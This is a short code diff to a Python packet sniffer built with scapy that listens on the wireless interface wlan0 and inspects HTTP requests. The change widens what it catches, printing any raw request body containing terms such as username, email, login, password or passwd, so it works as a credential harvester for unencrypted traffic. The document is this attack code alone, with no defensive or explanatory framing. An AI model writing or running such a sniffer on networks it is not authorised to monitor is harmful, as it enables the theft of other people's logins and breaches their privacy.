@@ -10,7 +10,11 @@ def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
-            if "username".encode() in load:
-                print(load)
+            keywords_list = ["username", "name", "user", "email", "usr", "login", "password", "pass", "pwd", "passwd"]
+            keywords = [x.encode() for x in keywords_list]
+            for keyword in keywords:
+                if keyword in load:
+                    print(load)
+                    break
 
 sniff("wlan0")
